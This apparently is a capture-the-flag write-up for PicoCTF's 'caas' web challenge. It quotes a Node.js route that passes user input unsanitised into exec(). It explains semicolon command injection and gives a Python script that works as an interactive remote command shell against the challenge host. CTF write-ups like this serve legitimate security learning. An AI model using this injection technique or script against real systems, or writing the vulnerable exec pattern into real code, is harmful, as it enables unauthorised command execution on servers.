# caas 
## picoctf web

[solve.py](solve.py)


### Its a web challenge from PicoCTF
We got a webpage with a input field which do cowsay commad with input value when input event is triggered.

## Vulnerable Code

```js
app.get('/cowsay/:message', (req, res) => {
  exec(`/usr/games/cowsay ${req.params.message}`, {timeout: 5000}, (error, stdout) => {
 ```
 
 Here we can see exec is used which is one of the dangerous functions and another factor is that no input sanitations applied.
## POC

As we know about the vuln we can put a semi-colon ```;``` to gain arbitrary command execution. If a user wants to execute system commmads they can directly pass the command to the input after adding a semi-colon


## Exploitaion

A simple python script using cmd module
```python
import requests
import cmd

url = "https://caas.mars.picoctf.net/cowsay/hi;"

class Caas(cmd.Cmd):
	prompt = "(caas) => "

	def __init__(self):
		super(Caas, self).__init__()
		self.url = url 
		self.completedefault = None
	def default(self, args):
		if args in ['exit', 'EXIT', 'quit', 'QUIT']:
			exit()
		r = requests.get(self.url+str(args))
		print(r.text)

if __name__=='__main__':
	Caas().cmdloop()
```
